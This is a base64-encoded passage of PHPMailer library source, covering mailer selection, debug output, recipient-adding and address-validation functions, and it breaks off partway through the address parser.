ICAgICogVW5pcXVlIElEIHVzZWQgZm9yIG1lc3NhZ2UgSUQgYW5kIGJvdW5kYXJpZXMuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICR1bmlxdWVpZCA9ICcnOwoKICAgIC8qKgogICAgICogRXJyb3Igc2V2ZXJpdHk6IG1lc3NhZ2Ugb25seSwgY29udGludWUgcHJvY2Vzc2luZy4KICAgICAqLwogICAgY29uc3QgU1RPUF9NRVNTQUdFID0gMDsKCiAgICAvKioKICAgICAqIEVycm9yIHNldmVyaXR5OiBtZXNzYWdlLCBsaWtlbHkgb2sgdG8gY29udGludWUgcHJvY2Vzc2luZy4KICAgICAqLwogICAgY29uc3QgU1RPUF9DT05USU5VRSA9IDE7CgogICAgLyoqCiAgICAgKiBFcnJvciBzZXZlcml0eTogbWVzc2FnZSwgcGx1cyBmdWxsIHN0b3AsIGNyaXRpY2FsIGVycm9yIHJlYWNoZWQuCiAgICAgKi8KICAgIGNvbnN0IFNUT1BfQ1JJVElDQUwgPSAyOwoKICAgIC8qKgogICAgICogU01UUCBSRkMgc3RhbmRhcmQgbGluZSBlbmRpbmcuCiAgICAgKi8KICAgIGNvbnN0IENSTEYgPSAiCiI7CgogICAgLyoqCiAgICAgKiBUaGUgbWF4aW11bSBsaW5lIGxlbmd0aCBhbGxvd2VkIGJ5IFJGQyAyODIyIHNlY3Rpb24gMi4xLjEKICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBjb25zdCBNQVhfTElORV9MRU5HVEggPSA5OTg7CgogICAgLyoqCiAgICAgKiBDb25zdHJ1Y3Rvci4KICAgICAqIEBwYXJhbSBib29sZWFuICRleGNlcHRpb25zIFNob3VsZCB3ZSB0aHJvdyBleHRlcm5hbCBleGNlcHRpb25zPwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGV4Y2VwdGlvbnMgPSBudWxsKQogICAgewogICAgICAgIGlmICgkZXhjZXB0aW9ucyAhPT0gbnVsbCkgewogICAgICAgICAgICAkdGhpcy0+ZXhjZXB0aW9ucyA9IChib29sZWFuKSRleGNlcHRpb25zOwogICAgICAgIH0KICAgICAgICAvL1BpY2sgYW4gYXBwcm9wcmlhdGUgZGVidWcgb3V0cHV0IGZvcm1hdCBhdXRvbWF0aWNhbGx5CiAgICAgICAgJHRoaXMtPkRlYnVnb3V0cHV0ID0gKHN0cnBvcyhQSFBfU0FQSSwgJ2NsaScpICE9PSBmYWxzZSA/ICdlY2hvJyA6ICdodG1sJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBEZXN0cnVjdG9yLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gX19kZXN0cnVjdCgpCiAgICB7CiAgICAgICAgLy9DbG9zZSBhbnkgb3BlbiBTTVRQIGNvbm5lY3Rpb24gbmljZWx5CiAgICAgICAgJHRoaXMtPnNtdHBDbG9zZSgpOwogICAgfQoKICAgIC8qKgogICAgICogQ2FsbCBtYWlsKCkgaW4gYSBzYWZlX21vZGUtYXdhcmUgZmFzaGlvbi4KICAgICAqIEFsc28sIHVubGVzcyBzZW5kbWFpbF9wYXRoIHBvaW50cyB0byBzZW5kbWFpbCAob3Igc29tZXRoaW5nIHRoYXQKICAgICAqIGNsYWltcyB0byBiZSBzZW5kbWFpbCksIGRvbid0IHBhc3MgcGFyYW1zIChub3QgYSBwZXJmZWN0IGZpeCwKICAgICAqIGJ1dCBpdCB3aWxsIGRvKQogICAgICogQHBhcmFtIHN0cmluZyAkdG8gVG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN1YmplY3QgU3ViamVjdAogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSBNZXNzYWdlIEJvZHkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGhlYWRlciBBZGRpdGlvbmFsIEhlYWRlcihzKQogICAgICogQHBhcmFtIHN0cmluZyAkcGFyYW1zIFBhcmFtcwogICAgICogQGFjY2VzcyBwcml2YXRlCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHJpdmF0ZSBmdW5jdGlvbiBtYWlsUGFzc3RocnUoJHRvLCAkc3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpCiAgICB7CiAgICAgICAgLy9DaGVjayBvdmVybG9hZGluZyBvZiBtYWlsIGZ1bmN0aW9uIHRvIGF2b2lkIGRvdWJsZS1lbmNvZGluZwogICAgICAgIGlmIChpbmlfZ2V0KCdtYnN0cmluZy5mdW5jX292ZXJsb2FkJykgJiAxKSB7CiAgICAgICAgICAgICRzdWJqZWN0ID0gJHRoaXMtPnNlY3VyZUhlYWRlcigkc3ViamVjdCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHN1YmplY3QgPSAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJHN1YmplY3QpKTsKICAgICAgICB9CgogICAgICAgIC8vQ2FuJ3QgdXNlIGFkZGl0aW9uYWxfcGFyYW1ldGVycyBpbiBzYWZlX21vZGUsIGNhbGxpbmcgbWFpbCgpIHdpdGggbnVsbCBwYXJhbXMgYnJlYWtzCiAgICAgICAgLy9AbGluayBodHRwOi8vcGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24ubWFpbC5waHAKICAgICAgICBpZiAoaW5pX2dldCgnc2FmZV9tb2RlJykgb3IgISR0aGlzLT5Vc2VTZW5kbWFpbE9wdGlvbnMgb3IgaXNfbnVsbCgkcGFyYW1zKSkgewogICAgICAgICAgICAkcmVzdWx0ID0gQG1haWwoJHRvLCAkc3ViamVjdCwgJGJvZHksICRoZWFkZXIpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRyZXN1bHQgPSBAbWFpbCgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQogICAgLyoqCiAgICAgKiBPdXRwdXQgZGVidWdnaW5nIGluZm8gdmlhIHVzZXItZGVmaW5lZCBtZXRob2QuCiAgICAgKiBPbmx5IGdlbmVyYXRlcyBvdXRwdXQgaWYgU01UUCBkZWJ1ZyBvdXRwdXQgaXMgZW5hYmxlZCAoQHNlZSBTTVRQOjokZG9fZGVidWcpLgogICAgICogQHNlZSBQSFBNYWlsZXI6OiREZWJ1Z291dHB1dAogICAgICogQHNlZSBQSFBNYWlsZXI6OiRTTVRQRGVidWcKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZWRlYnVnKCRzdHIpCiAgICB7CiAgICAgICAgaWYgKCR0aGlzLT5TTVRQRGVidWcgPD0gMCkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIC8vQXZvaWQgY2xhc2ggd2l0aCBidWlsdC1pbiBmdW5jdGlvbiBuYW1lcwogICAgICAgIGlmICghaW5fYXJyYXkoJHRoaXMtPkRlYnVnb3V0cHV0LCBhcnJheSgnZXJyb3JfbG9nJywgJ2h0bWwnLCAnZWNobycpKSBhbmQgaXNfY2FsbGFibGUoJHRoaXMtPkRlYnVnb3V0cHV0KSkgewogICAgICAgICAgICBjYWxsX3VzZXJfZnVuYygkdGhpcy0+RGVidWdvdXRwdXQsICRzdHIsICR0aGlzLT5TTVRQRGVidWcpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJHRoaXMtPkRlYnVnb3V0cHV0KSB7CiAgICAgICAgICAgIGNhc2UgJ2Vycm9yX2xvZyc6CiAgICAgICAgICAgICAgICAvL0Rvbid0IG91dHB1dCwganVzdCBsb2cKICAgICAgICAgICAgICAgIGVycm9yX2xvZygkc3RyKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdodG1sJzoKICAgICAgICAgICAgICAgIC8vQ2xlYW5zIHVwIG91dHB1dCBhIGJpdCBmb3IgYSBiZXR0ZXIgbG9va2luZywgSFRNTC1zYWZlIG91dHB1dAogICAgICAgICAgICAgICAgZWNobyBodG1sZW50aXRpZXMoCiAgICAgICAgICAgICAgICAgICAgcHJlZ19yZXBsYWNlKCcvWwpdKy8nLCAnJywgJHN0ciksCiAgICAgICAgICAgICAgICAgICAgRU5UX1FVT1RFUywKICAgICAgICAgICAgICAgICAgICAnVVRGLTgnCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAuICI8YnI+CiI7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnZWNobyc6CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAvL05vcm1hbGl6ZSBsaW5lIGJyZWFrcwogICAgICAgICAgICAgICAgJHN0ciA9IHByZWdfcmVwbGFjZSgnLwo/L21zJywgIgoiLCAkc3RyKTsKICAgICAgICAgICAgICAgIGVjaG8gZ21kYXRlKCdZLW0tZCBIOmk6cycpIC4gIgkiIC4gc3RyX3JlcGxhY2UoCiAgICAgICAgICAgICAgICAgICAgIgoiLAogICAgICAgICAgICAgICAgICAgICIKICAgICAgICAgICAgICAgICAgIAkgICAgICAgICAgICAgICAgICAiLAogICAgICAgICAgICAgICAgICAgIHRyaW0oJHN0cikKICAgICAgICAgICAgICAgICkgLiAiCiI7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtZXNzYWdlcyB1c2luZyBTTVRQLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc1NNVFAoKQogICAgewogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnc210cCc7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1lc3NhZ2VzIHVzaW5nIFBIUCdzIG1haWwoKSBmdW5jdGlvbi4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNNYWlsKCkKICAgIHsKICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ21haWwnOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtZXNzYWdlcyB1c2luZyAkU2VuZG1haWwuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzU2VuZG1haWwoKQogICAgewogICAgICAgICRpbmlfc2VuZG1haWxfcGF0aCA9IGluaV9nZXQoJ3NlbmRtYWlsX3BhdGgnKTsKCiAgICAgICAgaWYgKCFzdHJpc3RyKCRpbmlfc2VuZG1haWxfcGF0aCwgJ3NlbmRtYWlsJykpIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJy91c3Ivc2Jpbi9zZW5kbWFpbCc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJGluaV9zZW5kbWFpbF9wYXRoOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ3NlbmRtYWlsJzsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgcW1haWwuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzUW1haWwoKQogICAgewogICAgICAgICRpbmlfc2VuZG1haWxfcGF0aCA9IGluaV9nZXQoJ3NlbmRtYWlsX3BhdGgnKTsKCiAgICAgICAgaWYgKCFzdHJpc3RyKCRpbmlfc2VuZG1haWxfcGF0aCwgJ3FtYWlsJykpIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJy92YXIvcW1haWwvYmluL3FtYWlsLWluamVjdCc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJGluaV9zZW5kbWFpbF9wYXRoOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ3FtYWlsJzsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhICJUbyIgYWRkcmVzcy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQWRkcmVzcygkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygndG8nLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgIkNDIiBhZGRyZXNzLgogICAgICogQG5vdGU6IFRoaXMgZnVuY3Rpb24gd29ya3Mgd2l0aCB0aGUgU01UUCBtYWlsZXIgb24gd2luMzIsIG5vdCB3aXRoIHRoZSAibWFpbCIgbWFpbGVyLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBzZW5kIHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRDQygkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnY2MnLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgIkJDQyIgYWRkcmVzcy4KICAgICAqIEBub3RlOiBUaGlzIGZ1bmN0aW9uIHdvcmtzIHdpdGggdGhlIFNNVFAgbWFpbGVyIG9uIHdpbjMyLCBub3Qgd2l0aCB0aGUgIm1haWwiIG1haWxlci4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQkNDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCdiY2MnLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgIlJlcGx5LVRvIiBhZGRyZXNzLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byByZXBseSB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkUmVwbHlUbygkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnUmVwbHktVG8nLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGFuIGFkZHJlc3MgdG8gb25lIG9mIHRoZSByZWNpcGllbnQgYXJyYXlzIG9yIHRvIHRoZSBSZXBseVRvIGFycmF5LiBCZWNhdXNlIFBIUE1haWxlcgogICAgICogY2FuJ3QgdmFsaWRhdGUgYWRkcmVzc2VzIHdpdGggYW4gSUROIHdpdGhvdXQga25vd2luZyB0aGUgUEhQTWFpbGVyOjokQ2hhclNldCAodGhhdCBjYW4gc3RpbGwKICAgICAqIGJlIG1vZGlmaWVkIGFmdGVyIGNhbGxpbmcgdGhpcyBmdW5jdGlvbiksIGFkZGl0aW9uIG9mIHN1Y2ggYWRkcmVzc2VzIGlzIGRlbGF5ZWQgdW50aWwgc2VuZCgpLgogICAgICogQWRkcmVzc2VzIHRoYXQgaGF2ZSBiZWVuIGFkZGVkIGFscmVhZHkgcmV0dXJuIGZhbHNlLCBidXQgZG8gbm90IHRocm93IGV4Y2VwdGlvbnMuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRraW5kIE9uZSBvZiAndG8nLCAnY2MnLCAnYmNjJywgb3IgJ1JlcGx5VG8nCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQsIHJlc3AuIHRvIHJlcGx5IHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGFkZE9yRW5xdWV1ZUFuQWRkcmVzcygka2luZCwgJGFkZHJlc3MsICRuYW1lKQogICAgewogICAgICAgICRhZGRyZXNzID0gdHJpbSgkYWRkcmVzcyk7CiAgICAgICAgJG5hbWUgPSB0cmltKHByZWdfcmVwbGFjZSgnL1sKXSsvJywgJycsICRuYW1lKSk7IC8vU3RyaXAgYnJlYWtzIGFuZCB0cmltCiAgICAgICAgaWYgKCgkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKSkgPT09IGZhbHNlKSB7CiAgICAgICAgICAgIC8vIEF0LXNpZ24gaXMgbWlzc3NpbmcuCiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gIiAoYWRkQW5BZGRyZXNzICRraW5kKTogJGFkZHJlc3MiOwogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgICRwYXJhbXMgPSBhcnJheSgka2luZCwgJGFkZHJlc3MsICRuYW1lKTsKICAgICAgICAvLyBFbnF1ZXVlIGFkZHJlc3NlcyB3aXRoIElETiB1bnRpbCB3ZSBrbm93IHRoZSBQSFBNYWlsZXI6OiRDaGFyU2V0LgogICAgICAgIGlmICgkdGhpcy0+aGFzOGJpdENoYXJzKHN1YnN0cigkYWRkcmVzcywgKyskcG9zKSkgYW5kICR0aGlzLT5pZG5TdXBwb3J0ZWQoKSkgewogICAgICAgICAgICBpZiAoJGtpbmQgIT0gJ1JlcGx5LVRvJykgewogICAgICAgICAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKCRhZGRyZXNzLCAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlKSkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5SZWNpcGllbnRzUXVldWVbJGFkZHJlc3NdID0gJHBhcmFtczsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygkYWRkcmVzcywgJHRoaXMtPlJlcGx5VG9RdWV1ZSkpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+UmVwbHlUb1F1ZXVlWyRhZGRyZXNzXSA9ICRwYXJhbXM7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAvLyBJbW1lZGlhdGVseSBhZGQgc3RhbmRhcmQgYWRkcmVzc2VzIHdpdGhvdXQgSUROLgogICAgICAgIHJldHVybiBjYWxsX3VzZXJfZnVuY19hcnJheShhcnJheSgkdGhpcywgJ2FkZEFuQWRkcmVzcycpLCAkcGFyYW1zKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBhZGRyZXNzIHRvIG9uZSBvZiB0aGUgcmVjaXBpZW50IGFycmF5cyBvciB0byB0aGUgUmVwbHlUbyBhcnJheS4KICAgICAqIEFkZHJlc3NlcyB0aGF0IGhhdmUgYmVlbiBhZGRlZCBhbHJlYWR5IHJldHVybiBmYWxzZSwgYnV0IGRvIG5vdCB0aHJvdyBleGNlcHRpb25zLgogICAgICogQHBhcmFtIHN0cmluZyAka2luZCBPbmUgb2YgJ3RvJywgJ2NjJywgJ2JjYycsIG9yICdSZXBseVRvJwogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBzZW5kLCByZXNwLiB0byByZXBseSB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbiB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhZGRBbkFkZHJlc3MoJGtpbmQsICRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIGlmICghaW5fYXJyYXkoJGtpbmQsIGFycmF5KCd0bycsICdjYycsICdiY2MnLCAnUmVwbHktVG8nKSkpIHsKICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnSW52YWxpZCByZWNpcGllbnQga2luZDogJykgLiAka2luZDsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoISR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7CiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gIiAoYWRkQW5BZGRyZXNzICRraW5kKTogJGFkZHJlc3MiOwogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGlmICgka2luZCAhPSAnUmVwbHktVG8nKSB7CiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRhZGRyZXNzKSwgJHRoaXMtPmFsbF9yZWNpcGllbnRzKSkgewogICAgICAgICAgICAgICAgYXJyYXlfcHVzaCgkdGhpcy0+JGtpbmQsIGFycmF5KCRhZGRyZXNzLCAkbmFtZSkpOwogICAgICAgICAgICAgICAgJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGFkZHJlc3MpXSA9IHRydWU7CiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRhZGRyZXNzKSwgJHRoaXMtPlJlcGx5VG8pKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+UmVwbHlUb1tzdHJ0b2xvd2VyKCRhZGRyZXNzKV0gPSBhcnJheSgkYWRkcmVzcywgJG5hbWUpOwogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogUGFyc2UgYW5kIHZhbGlkYXRlIGEgc3RyaW5nIGNvbnRhaW5pbmcgb25lIG9yIG1vcmUgUkZDODIyLXN0eWxlIGNvbW1hLXNlcGFyYXRlZCBlbWFpbCBhZGRyZXNzZXMKICAgICAqIG9mIHRoZSBmb3JtICJkaXNwbGF5IG5hbWUgPGFkZHJlc3M+IiBpbnRvIGFuIGFycmF5IG9mIG5hbWUvYWRkcmVzcyBwYWlycy4KICAgICAqIFVzZXMgdGhlIGltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QgZnVuY3Rpb24gaWYgdGhlIElNQVAgZXh0ZW5zaW9uIGlzIGF2YWlsYWJsZS4KICAgICAqIE5vdGUgdGhhdCBxdW90ZXMgaW4gdGhlIG5hbWUgcGFydCBhcmUgcmVtb3ZlZC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJzdHIgVGhlIGFkZHJlc3MgbGlzdCBzdHJpbmcKICAgICAqIEBwYXJhbSBib29sICR1c2VpbWFwIFdoZXRoZXIgdG8gdXNlIHRoZSBJTUFQIGV4dGVuc2lvbiB0byBwYXJzZSB0aGUgbGlzdAogICAgICogQHJldHVybiBhcnJheQogICAgICogQGxpbmsgaHR0cDovL3d3dy5hbmRyZXcuY211LmVkdS91c2VyL2FncmVlbjEvdGVzdGluZy9tcmJzL3dlYi9NYWlsL1JGQzgyMi5waHAgQSBtb3JlIGNhcmVmdWwgaW1wbGVtZW50YXRpb24KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHBhcnNlQWRkcmVzc2VzKCRhZGRyc3RyLCAkdXNlaW1hcCA9IHRydWUpCiAgICB7CiAgICAgICAgJGFkZHJlc3NlcyA9IGFycmF5KCk7CiAgICAgICAgaWYgKCR1c2VpbWFwIGFuZCBmdW5jdGlvbl9leGlzdHMoJ2ltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QnKSkgewogICAgICAgICAgICAvL1VzZSB0aGlzIGJ1aWx0LWluIHBhcnNlciBpZiBpdCdzIGF2YWlsYWJsZQogICAgICAgICAgICAkbGlzdCA9IGltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QoJGFkZHJzdHIsICcnKTsKICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QgYXMgJGFkZHJlc3MpIHsKICAgICAgICAgICAgICAgIGlmICgkYWRkcmVzcy0+aG9zdCAhPSAnLlNZTlRBWC1FUlJPUi4nKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MtPm1haWxib3ggLiAnQCcgLiAkYWRkcmVzcy0+aG9zdCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gKHByb3BlcnR5X2V4aXN0cygkYWRkcmVzcywgJ3BlcnNvbmFsJykgPyAkYWRkcmVzcy0+cGVyc29uYWwgOiAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWRkcmVzcycgPT4gJGFkZHJlc3MtPm1haWxib3ggLiAnQCcgLiAkYWRkcmVzcy0+aG9zdAogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vVXNlIHRoaXMgc2ltcGxlciBwYXJzZXIKICAgICAgICAgICAgJGxpc3QgPSBleHBsb2RlKCcsJywgJGFkZHJzdHIpOwogICAgICAgICAgICBmb3JlYWNoICgkbGlzdCBhcyAkYWRkcmVzcykgewogICAgICAgICAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRh